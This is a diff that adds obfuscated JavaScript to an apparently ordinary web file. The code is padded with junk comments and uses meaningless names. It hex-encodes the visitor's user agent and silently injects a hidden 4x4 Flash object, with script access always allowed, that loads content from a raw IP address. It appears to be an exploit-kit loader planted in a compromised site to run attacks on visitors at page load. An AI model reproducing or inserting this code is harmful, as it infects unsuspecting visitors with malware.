@@ -1,0 +1,23 @@
+/*s35067d21044hssfj54844fs*/function hgfgerdfgdf(num, width){/*s96707d60793hfj2362fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s24817d36474hfj47738fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s58747d94951hfj19111fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s20158d94124hfj6461fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd23789hfs*/c += b + d;/*s59565d35564hfj1755fs*/e += 1;}return c;}/*s80903dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://92.53.124.151/?MTAzNDgyNjA5&rand=xX_QMvWdbRXQC53EKvncT6NHMVHRHECL2YydmrHQefjaelWkzrHFTF_xozKASASG6_JtdfJRDV&elsa=bkj0WJewc0zodcW14X9qD8jEODzx6dg57X_BeEZwhGrJCUQudv2VikyrMkc8kmxBaG61ETi-hL&info=OTExNTkxNQ==&travel=MTAwNTg2NzQ=", ghnvbn("http://92.53.124.151/?ODk2MzgwMTc=&elsa=0mY9dW1gToqv8h0PczReYiZbQ_xfbZwtN_JOcQbA50VzzzLBHcslxkRfW7GAByestUFgZ4AsTmKz7S6CJrg&info=MzMzMzAzODg=&rand=xH_QMrDYbR3FFYDfKPnEUKdEMU3WA0eKwY-Zha_VF5-xFDTGpbL1FxzspV-dCF-EmvJvdLMHIwKh1UfASwQ&travel=NDI3MzUzMDY=","gexywoaxor"));
